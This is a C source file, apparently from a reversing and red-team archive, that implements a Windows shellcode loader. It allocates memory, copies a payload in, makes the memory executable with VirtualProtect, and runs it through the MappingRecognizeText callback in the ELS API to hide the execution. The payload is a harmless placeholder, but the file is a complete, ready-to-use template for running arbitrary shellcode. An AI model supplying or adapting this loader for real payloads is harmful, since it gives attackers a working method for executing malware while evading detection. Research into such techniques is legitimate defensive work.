/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  MappingRecognizeText
*/

#include <windows.h>
#include <elscore.h>
#include <elssrvc.h>
#include <stdint.h>

#pragma comment(lib,"elscore")


int main ()
{
    void * runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    MAPPING_ENUM_OPTIONS    enum_opt;
    MAPPING_OPTIONS         options;
    MAPPING_PROPERTY_BAG    bag;
    PMAPPING_SERVICE_INFO   services = NULL;
    DWORD                   svccount;
    wchar_t *               text = L"Reversing.ID Shellcode Loader.";
    wchar_t *               p;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        ZeroMemory (&enum_opt, sizeof(MAPPING_ENUM_OPTIONS));
        enum_opt.Size    = sizeof(MAPPING_ENUM_OPTIONS);
        enum_opt.pGuid   = (GUID*)&ELS_GUID_LANGUAGE_DETECTION;

        ZeroMemory (&bag, sizeof(MAPPING_PROPERTY_BAG));
        bag.Size        = sizeof(MAPPING_PROPERTY_BAG);

        ZeroMemory (&options, sizeof(MAPPING_OPTIONS));
        options.Size    = sizeof(MAPPING_OPTIONS);
        options.pfnRecognizeCallback = (PFN_MAPPINGCALLBACKPROC)runtime;

        // trigger the callback
        // get the services and recognize the text
        MappingGetServices (&enum_opt, &services, &svccount);
        MappingRecognizeText (services, text, wcslen(text), 0, &options, &bag);

        for (p = (WCHAR*)bag.prgResultRanges[0].pData; *p; p += wcslen(p) + 1)
        { }

        // free the resources
        MappingFreePropertyBag (&bag);
        MappingFreeServices (services);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}